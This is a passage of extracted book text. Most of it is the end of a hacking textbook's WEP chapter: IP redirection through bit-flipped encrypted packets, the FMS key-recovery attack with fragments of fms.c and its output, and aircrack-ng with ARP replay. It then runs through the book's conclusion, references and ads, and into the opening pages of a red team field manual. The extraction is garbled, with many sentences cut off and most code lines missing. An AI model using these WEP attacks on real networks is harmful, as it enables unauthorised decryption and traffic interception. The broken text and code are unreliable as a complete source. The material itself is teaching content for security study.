spam and the victim checks mail over the encrypted\nAfter plaintexts are recovered for an intercepted message, the keystream for\nthat IV will also be known. This means that this keystream can be used to\ndecrypt any other packet with the same IV, providing it\u2019s not longer than the\nrecovered keystream. Over time, it\u2019s possible to create a table of keystreams\nindexed by every possible IV. Since there are only 224 possible IVs, if 1,500\nbytes of keystream are saved for each IV, the table would only require about\n24GB of storage. Once a table like this is created, all subsequent encrypted\nRealistically, this method of attack would be very time consuming and\ntedious. It\u2019s an interesting idea, but there are much easier ways to defeat WEP.\nAnother way to decrypt encrypted packets is to trick the access point into\ndoing all the work. Usually, wireless access points have some form of Internet\nconnectivity, and if this is the case, an IP redirection attack is possible. First, an\nencrypted packet is captured, and the destination address is changed to an\nIP address the attacker controls, without decrypting the packet. Then, the\nmodified packet is sent back to the wireless access point, which will decrypt\nthe packet and send it right to the attacker\u2019s IP address.\nThe packet modification is made possible due to the CRC32 checksum\nbeing a linear, unkeyed function. This means that the packet can be strate-\ngically modified and the checksum will still come out the same.\nThis attack also assumes that the source and destination IP addresses\nare known. This information is easy enough to figure out, just based on\nthe standard internal network IP addressing schemes. Also, a few cases of\nkeystream reuse due to IV collisions can be used to determine the addresses.\nOnce the destination IP address is known, this value can be XORed with\nthe desired IP address, and this whole thing can be XORed into place in the\nencrypted packet. The XORing of the destination IP address will cancel out,\nleaving behind the desired IP address XORed with the keystream. Then, to\nensure that the checksum stays the same, the source IP address must be\nFor example, assume the source address is 192.168.2.57 and the\ndestination address is 192.168.2.1. The attacker controls the address\n123.45.67.89 and wants to redirect traffic there. These IP addresses\nexist in the packet in the binary form of high- and low-order 16-bit words.\nThe checksum will be changed by NH + NL \u2212 DH \u2212 DL, so this value must\nbe subtracted from somewhere else in the packet. Since the source address is\nalso known and doesn\u2019t matter too much, the low-order 16-bit word of that\nThe new source IP address should therefore be 192.168.10.92. The\nsource IP address can be modified in the encrypted packet using the same\nXORing trick, and then the checksums should match. When the packet is\nsent to the wireless access point, the packet will be decrypted and sent to\nIf the attacker happens to have the ability to monitor packets on an\nentire class B network, the source address doesn\u2019t even need to be modified.\nAssuming the attacker had control over the entire 123.45.X.X IP range, the\nlow-order 16-bit word of the IP address could be strategically chosen not to\ndisturb the checksum. If NL = DH + DL \u2212 NH, the checksum won\u2019t be changed.\nThe new destination IP address should be 123.45.75.124.\nThe Fluhrer, Mantin, and Shamir (FMS) attack is the most commonly\nused attack against WEP, popularized by tools such as AirSnort. This attack\nis really quite amazing. It takes advantage of weaknesses in the key-\nThere are weak IV values that leak information about the secret key in\nthe first byte of the keystream. Since the same key is used over and over with\ndifferent IVs, if enough packets with weak IVs are collected, and the first byte\nof the keystream is known, the key can be determined. Luckily, the first byte\nof an 802.11b packet is the snap header, which is almost always 0xAA. This\nmeans the first byte of the keystream can be easily obtained by XORing the\nNext, weak IVs need to be located. IVs for WEP are 24 bits, which trans-\nlates to three bytes. Weak IVs are in the form of (A + 3, N \u2212 1, X), where A is\nthe byte of the key to be attacked, N is 256 (since RC4 works in modulo 256),\nand X can be any value. So, if the zeroth byte of the keystream is being\nattacked, there would be 256 weak IVs in the form of (3, 255, X), where X\nranges from 0 to 255. The bytes of the keystream must be attacked in order,\nso the first byte cannot be attacked until the zeroth byte is known.\nThe algorithm itself is pretty simple. First, it performs A + 3 steps of the\nKey Scheduling Algorithm (KSA). This can be done without knowing the\nkey, since the IV will occupy the first three bytes of the K array. If the zeroth\nbyte of the key is known and A equals 1, the KSA can be worked to the fourth\nstep, since the first four bytes of the K array will be known.\nAt this point, if S[0] or S[1] have been disturbed by the last step, the\nentire attempt should be discarded. More simply stated, if j is less than 2, the\nattempt should be discarded. Otherwise, take the value of j and the value of\nS[A + 3], and subtract both of these from the first keystream byte (modulo\n256, of course). This value will be the correct key byte about 5 percent of the\ntime and effectively random less than 95 percent of the time. If this is done\nwith enough weak IVs (with varying values for X), the correct key byte can be\ndetermined. It takes about 60 IVs to bring the probability above 50 percent.\nAfter one key byte is determined, the whole process can be done again to\ndetermine the next key byte, until the entire key is revealed.\nFor the sake of demonstration, RC4 will be scaled back so N equals 16\ninstead of 256. This means that everything is modulo 16 instead of 256, and\nall the arrays are 16 \u201cbytes\u201d consisting of 4 bits, instead of 256 actual bytes.\nAssuming the key is (1, 2, 3, 4, 5), and the zeroth key byte will be attacked,\nA equals 0. This means the weak IVs should be in the form of (3, 15, X). In\nthis example, X will equal 2, so the seed value will be (3, 15, 2, 1, 2, 3, 4, 5).\nUsing this seed, the first byte of keystream output will be 9.\nSince the key is currently unknown, the K array is loaded up with what\ncurrently is known, and the S array is filled with sequential values from 0 to\n15. Then, j is initialized to 0, and the first three steps of the KSA are done.\nAt this point, j isn\u2019t less than 2, so the process can continue. S[3] is 1, j is\n7, and the first byte of keystream output was 9. So the zeroth byte of the key\nThis information can be used to determine the next byte of the key,\nusing IVs in the form of (4, 15, X) and working the KSA through to the\nfourth step. Using the IV (4, 15, 9), the first byte of keystream is 6.\nAgain, the correct key byte is determined. Of course, for the sake of\ndemonstration, values for X have been strategically picked. To give you a\ntrue sense of the statistical nature of the attack against a full RC4 imple-\nmentation, the following source code has been included:\nint key[13] = {1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213};\nprintf(\"Usage: %s <keybyte to attack>\\n\", argv[0]);\nprintf(\"Using IV: (%d, %d, %d), first keystream byte is %u\\n\",\nprintf(\"Doing the first %d steps of KSA..  \", A+3);\nif(j < 2) {  // If j < 2, then S[0] or S[1] have been disturbed.\nprintf(\"S[0] or S[1] have been disturbed, discarding..\\n\");\nprintf(\"at KSA iteration #%d, j=%d and S[%d]=%d\\n\",\nprintf(\"\\nFrequency table for key[%d] (* = most frequent)\\n\", A);\nThis code performs the FMS attack on 128-bit WEP (104-bit key, 24-bit IV),\nusing every possible value of X. The key byte to attack is the only argument,\nand the key is hard-coded into the key array. The following output shows the\ncompilation and execution of the fms.c code to crack an RC4 key.\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=5 and S[3]=1\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=6 and S[3]=1\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=7 and S[3]=1\nUsing IV: (3, 255, 252), first keystream byte is 175\nDoing the first 3 steps of KSA..  S[0] or S[1] have been disturbed,\nUsing IV: (3, 255, 253), first keystream byte is 149\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=2 and S[3]=1\nUsing IV: (3, 255, 254), first keystream byte is 253\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=3 and S[3]=2\nUsing IV: (3, 255, 255), first keystream byte is 72\nDoing the first 3 steps of KSA..  at KSA iteration #3, j=4 and S[3]=1\n0  1 |  32  3 |  64  0 |  96  1 | 128  2 | 160  0 | 192  1 | 224  3 |\n1 10*|  33  0 |  65  1 |  97  0 | 129  1 | 161  1 | 193  1 | 225  0 |\n2  0 |  34  1 |  66  0 |  98  1 | 130  1 | 162  1 | 194  1 | 226  1 |\n3  1 |  35  0 |  67  2 |  99  1 | 131  1 | 163  0 | 195  0 | 227  1 |\n4  0 |  36  0 |  68  0 | 100  1 | 132  0 | 164  0 | 196  2 | 228  0 |\n5  0 |  37  1 |  69  0 | 101  1 | 133  0 | 165  2 | 197  2 | 229  1 |\n6  0 |  38  0 |  70  1 | 102  3 | 134  2 | 166  1 | 198  1 | 230  2 |\n7  0 |  39  0 |  71  2 | 103  0 | 135  5 | 167  3 | 199  2 | 231  0 |\n8  3 |  40  0 |  72  1 | 104  0 | 136  1 | 168  0 | 200  1 | 232  1 |\n9  1 |  41  0 |  73  0 | 105  0 | 137  2 | 169  1 | 201  3 | 233  2 |\n10  1 |  42  3 |  74  1 | 106  2 | 138  0 | 170  1 | 202  3 | 234  0 |\n11  1 |  43  2 |  75  1 | 107  2 | 139  1 | 171  1 | 203  0 | 235  0 |\n12  0 |  44  1 |  76  0 | 108  0 | 140  2 | 172  1 | 204  1 | 236  1 |\n13  2 |  45  2 |  77  0 | 109  0 | 141  0 | 173  2 | 205  1 | 237  0 |\n14  0 |  46  0 |  78  2 | 110  2 | 142  2 | 174  1 | 206  0 | 238  1 |\n15  0 |  47  3 |  79  1 | 111  2 | 143  1 | 175  0 | 207  1 | 239  1 |\n16  1 |  48  1 |  80  1 | 112  0 | 144  2 | 176  0 | 208  0 | 240  0 |\n17  0 |  49  0 |  81  1 | 113  1 | 145  1 | 177  1 | 209  0 | 241  1 |\n18  1 |  50  0 |  82  0 | 114  0 | 146  4 | 178  1 | 210  1 | 242  0 |\n19  2 |  51  0 |  83  0 | 115  0 | 147  1 | 179  0 | 211  1 | 243  0 |\n20  3 |  52  0 |  84  3 | 116  1 | 148  2 | 180  2 | 212  2 | 244  3 |\n21  0 |  53  0 |  85  1 | 117  2 | 149  2 | 181  1 | 213  0 | 245  1 |\n22  0 |  54  3 |  86  3 | 118  0 | 150  2 | 182  2 | 214  0 | 246  3 |\n23  2 |  55  0 |  87  0 | 119  2 | 151  2 | 183  1 | 215  1 | 247  2 |\n24  1 |  56  2 |  88  3 | 120  1 | 152  2 | 184  1 | 216  0 | 248  2 |\n25  2 |  57  2 |  89  0 | 121  1 | 153  2 | 185  0 | 217  1 | 249  3 |\n26  0 |  58  0 |  90  0 | 122  0 | 154  1 | 186  1 | 218  0 | 250  1 |\n27  0 |  59  2 |  91  1 | 123  3 | 155  2 | 187  1 | 219  1 | 251  1 |\n28  2 |  60  1 |  92  1 | 124  0 | 156  0 | 188  0 | 220  0 | 252  3 |\n29  1 |  61  1 |  93  1 | 125  0 | 157  0 | 189  0 | 221  0 | 253  1 |\n30  0 |  62  1 |  94  0 | 126  1 | 158  1 | 190  0 | 222  1 | 254  0 |\n31  0 |  63  0 |  95  1 | 127  0 | 159  0 | 191  0 | 223  0 | 255  0 |\n[Actual Key] = (1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213)\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=251 and S[15]=1\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=252 and S[15]=1\nUsing IV: (15, 255, 2), first keystream byte is 159\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=253 and S[15]=1\nUsing IV: (15, 255, 252), first keystream byte is 238\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=236 and S[15]=1\nUsing IV: (15, 255, 253), first keystream byte is 197\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=236 and S[15]=1\nUsing IV: (15, 255, 254), first keystream byte is 238\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=249 and S[15]=2\nUsing IV: (15, 255, 255), first keystream byte is 176\nDoing the first 15 steps of KSA..  at KSA iteration #15, j=250 and S[15]=1\n0  1 |  32  0 |  64  2 |  96  0 | 128  1 | 160  1 | 192  0 | 224  2 |\n1  2 |  33  1 |  65  0 |  97  2 | 129  1 | 161  1 | 193  0 | 225  0 |\n2  0 |  34  2 |  66  2 |  98  0 | 130  2 | 162  3 | 194  2 | 226  0 |\n3  2 |  35  0 |  67  2 |  99  2 | 131  0 | 163  1 | 195  0 | 227  5 |\n4  0 |  36  0 |  68  0 | 100  1 | 132  0 | 164  0 | 196  1 | 228  1 |\n5  3 |  37  0 |  69  3 | 101  2 | 133  0 | 165  2 | 197  0 | 229  3 |\n6  1 |  38  2 |  70  2 | 102  0 | 134  0 | 166  2 | 198  0 | 230  2 |\n7  2 |  39  0 |  71  1 | 103  0 | 135  0 | 167  3 | 199  1 | 231  1 |\n8  1 |  40  0 |  72  0 | 104  1 | 136  1 | 168  2 | 200  0 | 232  0 |\n9  0 |  41  1 |  73  0 | 105  0 | 137  1 | 169  1 | 201  1 | 233  1 |\n10  2 |  42  2 |  74  0 | 106  4 | 138  2 | 170  0 | 202  1 | 234  0 |\n11  3 |  43  1 |  75  0 | 107  1 | 139  3 | 171  2 | 203  1 | 235  0 |\n12  2 |  44  0 |  76  0 | 108  2 | 140  2 | 172  0 | 204  0 | 236  1 |\n13  0 |  45  0 |  77  0 | 109  1 | 141  1 | 173  0 | 205  2 | 237  4 |\n14  1 |  46  1 |  78  1 | 110  0 | 142  3 | 174  1 | 206  0 | 238  1 |\n15  1 |  47  2 |  79  1 | 111  0 | 143  0 | 175  1 | 207  2 | 239  0 |\n16  2 |  48  0 |  80  1 | 112  1 | 144  3 | 176  0 | 208  0 | 240  0 |\n17  1 |  49  0 |  81  0 | 113  1 | 145  1 | 177  0 | 209  0 | 241  0 |\n18  0 |  50  2 |  82  0 | 114  1 | 146  0 | 178  0 | 210  1 | 242  0 |\n19  0 |  51  0 |  83  4 | 115  1 | 147  0 | 179  1 | 211  4 | 243  2 |\n20  0 |  52  1 |  84  1 | 116  4 | 148  0 | 180  1 | 212  1 | 244  1 |\n21  0 |  53  1 |  85  1 | 117  0 | 149  2 | 181  1 | 213 12*| 245  1 |\n22  1 |  54  3 |  86  0 | 118  0 | 150  1 | 182  2 | 214  3 | 246  1 |\n23  0 |  55  3 |  87  0 | 119  1 | 151  0 | 183  0 | 215  0 | 247  0 |\n24  0 |  56  1 |  88  0 | 120  0 | 152  2 | 184  0 | 216  2 | 248  0 |\n25  1 |  57  0 |  89  0 | 121  2 | 153  0 | 185  2 | 217  1 | 249  0 |\n26  1 |  58  0 |  90  1 | 122  0 | 154  1 | 186  0 | 218  1 | 250  2 |\n27  2 |  59  1 |  91  1 | 123  0 | 155  1 | 187  1 | 219  0 | 251  2 |\n28  2 |  60  2 |  92  1 | 124  1 | 156  1 | 188  1 | 220  0 | 252  0 |\n29  1 |  61  1 |  93  3 | 125  2 | 157  2 | 189  2 | 221  0 | 253  1 |\n30  0 |  62  1 |  94  0 | 126  0 | 158  1 | 190  1 | 222  1 | 254  2 |\n31  0 |  63  0 |  95  1 | 127  0 | 159  0 | 191  0 | 223  2 | 255  0 |\n[Actual Key] = (1, 2, 3, 4, 5, 66, 75, 123, 99, 100, 123, 43, 213)\nThis type of attack has been so successful that a new wireless protocol\ncalled WPA should be used if you expect any form of security. However,\nthere are still an amazing number of wireless networks only protected by\nWEP. Nowadays, there are fairly robust tools to perform WEP attacks. One\nnotable example is aircrack, which has been included with the LiveCD;\nhowever, it requires wireless hardware, which you may not have. There is\nplenty of documentation on how to use this tool, which is in constant\ndevelopment. The first manual page should get you started.\nAIRCRACK-NG(1)                                                     AIRCRACK-NG(1)\naircrack-ng  is  a 802.11 WEP / WPA-PSK key cracker. It implements the so-\ncalled Fluhrer - Mantin - Shamir (FMS) attack, along with some new attacks\nby  a talented hacker named KoreK. When enough encrypted packets have been\ngathered, aircrack-ng can almost instantly recover the WEP key.\nForce the attack mode, 1 or wep for WEP and 2 or wpa for WPA-PSK.\nSelect the target network based on the ESSID. This option  is  also\nAgain, consult the Internet for hardware issues. This program popularized\na clever technique for gathering IVs. Waiting to gather enough IVs from\npackets would take hours, or even days. But since wireless is still a network,\nthere will be ARP traffic. Since WEP encryption doesn\u2019t modify the size of\nthe packet, it\u2019s easy to pick out which ones are ARP. This attack captures\nan encrypted packet that is the size of an ARP request, and then replays\nit to the network thousands of times. Each time, the packet is decrypted\nand sent to the network, and a corresponding ARP reply is sent back out.\nThese extra replies don\u2019t harm the network; however, they do generate a\nseparate packet with a new IV. Using this technique of tickling the network,\nenough IVs to crack the WEP key can be gathered in just a few minutes.\nmedia likes to sensationalize, which only exacerbates\nmind-set. Hackers are just people with innovative spirits and an in-depth\nknowledge of technology. Hackers aren\u2019t necessarily criminals, though as\nlong as crime has the potential to pay, there will always be some criminals\nwho are hackers. There\u2019s nothing wrong with the hacker knowledge itself,\nLike it or not, vulnerabilities exist in the software and networks that the\nworld depends on from day to day. It\u2019s simply an inevitable result of the fast\npace of software development. New software is often successful at first, even if\nthere are vulnerabilities. This success means money, which attracts criminals\nwho learn how to exploit these vulnerabilities for financial gain. This seems\nlike it would be an endless downward spiral, but fortunately, all the people\nfinding the vulnerabilities in software are not just profit-driven, malicious\ncriminals. These people are hackers, each with his or her own motives; some\nare driven by curiosity, others are paid for their work, still others just like the\nchallenge, and several are, in fact, criminals. The majority of these people\ndon\u2019t have malicious intent; instead, they help vendors fix their vulnerable\nsoftware. Without hackers, the vulnerabilities and holes in software would\nremain undiscovered. Unfortunately, the legal system is slow and mostly\nignorant with regard to technology. Often, draconian laws are passed and\nexcessive sentences are given to try to scare people away from looking\nclosely. This is childish logic\u2014discouraging hackers from exploring and\nlooking for vulnerabilities doesn\u2019t solve anything. Convincing everyone the\nemperor is wearing fancy new clothes doesn\u2019t change the reality that he\u2019s\nnaked. Undiscovered vulnerabilities just lie in wait for someone much more\nmalicious than an average hacker to discover them. The danger of software\nvulnerabilities is that the payload could be anything. Replicating Internet\nworms are relatively benign when compared to the nightmare terrorism\nscenarios these laws are so afraid of. Restricting hackers with laws can\nmake the worst-case scenarios more likely, since it leaves more undiscovered\nvulnerabilities to be exploited by those who aren\u2019t bound by the law and\nSome could argue that if there weren\u2019t hackers, there would be no\nreason to fix these undiscovered vulnerabilities. That is one perspective, but\npersonally I prefer progress over stagnation. Hackers play a very important\nrole in the co-evolution of technology. Without hackers, there would be little\nreason for computer security to improve. Besides, as long as the questions\n\u201cWhy?\u201d and \u201cWhat if?\u201d are asked, hackers will always exist. A world without\nhackers would be a world without curiosity and innovation.\nHopefully, this book has explained some basic techniques of hacking and\nperhaps even the spirit of it. Technology is always changing and expanding,\nso there will always be new hacks. There will always be new vulnerabilities in\nsoftware, ambiguities in protocol specifications, and a myriad of other over-\nsights. The knowledge gained from this book is just a starting point. It\u2019s up to\nyou to expand upon it by continually figuring out how things work, wondering\nabout the possibilities, and thinking of the things that the developers didn\u2019t\nthink of. It\u2019s up to you to make the best of these discoveries and apply this\nknowledge however you see fit. Information itself isn\u2019t a crime.\nAleph1. \u201cSmashing the Stack for Fun and Profit.\u201d Phrack, no. 49, online pub-\nlication at http://www.phrack.org/issues.html?issue=49&id=14#article\nBennett, C., F. Bessette, and G. Brassard. \u201cExperimental Quantum\nCryptography.\u201d Journal of Cryptology, vol. 5, no. 1 (1992), 3\u201328.\nBorisov, N., I. Goldberg, and D. Wagner. \u201cSecurity of the WEP Algorithm.\u201d\nOnline publication at http://www.isaac.cs.berkeley.edu/isaac/\nBrassard, G. and P. Bratley. Fundamentals of Algorithmics. Englewood Cliffs, NJ:\nCNET News. \u201c40-Bit Crypto Proves No Problem.\u201d Online publication at\nConover, M. (Shok). \u201cw00w00 on Heap Overflows.\u201d Online publication at\nElectronic Frontier Foundation. \u201cFelten vs. RIAA.\u201d Online publication at\nEller, R. (caezar). \u201cBypassing MSB Data Filters for Buffer Overflow Exploits\non Intel Platforms.\u201d Online publication at http://community.core-sdi\nFluhrer, S., I. Mantin, and A. Shamir. \u201cWeaknesses in the Key Scheduling\nAlgorithm of RC4.\u201d Online publication at http://citeseer.ist.psu.edu/\nGrover, L. \u201cQuantum Mechanics Helps in Searching for a Needle in a\nHaystack.\u201d Physical Review Letters, vol. 79, no. 2 (1997), 325\u201328.\nJoncheray, L. \u201cSimple Active Attack Against TCP.\u201d Online publication at\nLevy, S. Hackers: Heroes of the Computer Revolution. New York: Doubleday, 1984.\nMcCullagh, D. \u201cRussian Adobe Hacker Busted,\u201d Wired News, July 17, 2001.\nOnline publication at http://www.wired.com/news/politics/\nThe NASM Development Team. \u201cNASM\u2014The Netwide Assembler\n(Manual),\u201d version 0.98.34. Online publication at http://nasm\nRieck, K. \u201cFuzzy Fingerprints: Attacking Vulnerabilities in the Human\nBrain.\u201d Online publication at http://freeworld.thc.org/papers/ffp.pdf\nSchneier, B. Applied Cryptography: Protocols, Algorithms, and Source Code in C,\nScut and Team Teso. \u201cExploiting Format String Vulnerabilities,\u201d version 1.2.\nShor, P. \u201cPolynomial-Time Algorithms for Prime Factorization and Discrete\nLogarithms on a Quantum Computer.\u201d SIAM Journal of Computing, vol. 26\n(1997), 1484\u2013509. Online publication at http://www.arxiv.org/abs/\nSmith, N. \u201cStack Smashing Vulnerabilities in the UNIX Operating System.\u201d\nSolar Designer. \u201cGetting Around Non-Executable Stack (and Fix).\u201d BugTraq\nStinson, D. Cryptography: Theory and Practice. Boca Raton, FL: CRC Press, 1995.\nZwicky, E., S. Cooper, and D. Chapman. Building Internet Firewalls, 2nd ed.\nA programmer\u2019s calculator available from Peter Glen\nhttp://ibiblio.org/pub/Linux/apps/math/calc/pcalc-000.tar.gz\nThe Netwide Assembler, from the NASM Development Group\nA command-line packet injection tool from obecian (Mark Grimes) and\nA collection of network-sniffing tools from Dug Song\nA printable ASCII bytecode polymorpher from Matrix (Jose Ronnick)\nA fuzzy fingerprint\u2013generation tool from Konrad Rieck\nA Field Guide to Passive Reconnaissance and Indirect Attacks\nSilence on the Wire: A Field Guide to Passive Reconnaissance and Indirect Attacks\nexplains how computers and networks work, how information is processed\nand delivered, and what security threats lurk in the shadows. No humdrum\ntechnical white paper or how-to manual for protecting one\u2019s network, this\nbook is a fascinating narrative that explores a variety of unique, uncommon,\nand often quite elegant security challenges that defy classification and\nSecurity Data Visualization is a well-researched and richly illustrated introduc-\ntion to the field of information visualization, a branch of computer science\nconcerned with modeling complex data using interactive images. Greg Conti,\ncreator of the network and security visualization tool RUMINT, shows you\nhow to graph and display network data using a variety of tools so that you can\nunderstand complex datasets at a glance. And once you\u2019ve seen what a network\nattack looks like, you\u2019ll have a better understanding of its low-level behavior\u2014\nlike how vulnerabilities are exploited and how worms and viruses propagate.\nAttack Detection and Response with iptables, psad, and fwsnort\nLinux Firewalls discusses the technical details of the iptables firewall and the\nNetfilter framework that are built into the Linux kernel, and it explains how\nthey provide strong filtering, Network Address Translation (NAT), state track-\ning, and application layer inspection capabilities that rival many commercial\ntools. You\u2019ll learn how to deploy iptables as an IDS with psad and fwsnort\nand how to build a strong, passive authentication layer around iptables with\nfwknop. Concrete examples illustrate concepts such as firewall log analysis\nand policies, passive network authentication and authorization, exploit\nThe Art of Assembly Language presents assembly language from the high-level\nprogrammer\u2019s point of view, so you can start writing meaningful programs\nwithin days. The High Level Assembler (HLA) that accompanies the book\nis the first assembler that allows you to write portable assembly language\nprograms that run under either Linux or Windows with nothing more than\na recompile. The CD-ROM includes the HLA and the HLA Standard Library,\nall the source code from the book, and over 50,000 lines of additional sample\ncode, all well-documented and tested. The code compiles and runs as-is\nA Comprehensive, Illustrated Internet Protocols Reference\nThe TCP/IP Guide is a completely up-to-date, encyclopedic reference on\nthe TCP/IP protocol suite that will appeal to newcomers and the seasoned\nprofessional alike. Author Charles Kozierok details the core protocols that\nmake TCP/IP internetworks function and the most important classic TCP/IP\napplications, integrating IPv6 coverage throughout. Over 350 illustrations\nand hundreds of tables help to explain the finer points of this complex topic.\nThe book\u2019s personal, user-friendly writing style lets readers of all levels\nunderstand the dozens of protocols and technologies that run the Internet,\nwith full coverage of PPP, ARP, IP, IPv6, IP NAT, IPSec, Mobile IP, ICMP,\nRIP, BGP, TCP, UDP, DNS, DHCP, SNMP, FTP, SMTP, NNTP, HTTP,\nVisit http://www.nostarch.com/hacking2.htm for updates, errata, and other\nThe bootable LiveCD provides a Linux-based hacking environment that is\npreconfigured for programming, debugging, manipulating network traffic, and\ncracking encryption. It contains all the source code and applications used in\nthe book. Hacking is about discovery and innovation, and with this LiveCD you\ncan instantly follow along with the book\u2019s examples and explore on your own.\nThe LiveCD can be used in most common personal computers without\ninstalling a new operating system or modifying the computer\u2019s current setup.\nSystem requirements are an x86-based PC with at least 64MB of system memory\nand a BIOS that is configured to boot from a CD-ROM.\nlivecd provides a complete linux programming and debugging environment\nThis book uses RepKover\u2014a durable binding that won\u2019t snap shut.\nsolution to a difficult problem or exploiting holes in\nor connect-back shellcode, and alter a server\u2019s log\u00ad\nThe Art of Exploitation, 2nd Edition will give you a\nthe included Linux environment, and all you need is\nvulnerability researcher and security specialist in"}
{"source": "book", "book": "Books", "file": "RTFM - Red Team Field Manual v3.pdf", "text": "All rights reserved. No part of this work may be reproduced or transmitted\nProduct and company names mentioned herein may be the trademarks of their\nrespective owners. Rather than use a trademark symbol with every occurrence\nfashion, with no intention of infringement of the trademark. Use of a term\nin this book should not be regarded as affecting the validity of any\nwas taken to ensure the accuracy of the material, the author assumes no\nresulting from the use of the information contained herein.\n*NIX ................................................................................................................................................................. 4\nWINDOWS \u2022\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022\u2022...\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022...\u2022\u2022\u2022\u2022\u2022..\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022 14\nNETWORKING \u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022...\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022 34\nTIPS AND TRICKS ...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022...\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022..\u2022\u2022\u2022 42\nTOOL SYNTAX \u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022.\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022 50\nWEB \u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022..\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022...\u2022\u2022..\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022\u2022\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022..\u2022\u2022.\u2022\u2022\u2022\u2022\u2022\u2022\u2022.\u2022\u2022.\u2022\u2022.\u2022 66\nDATABASES 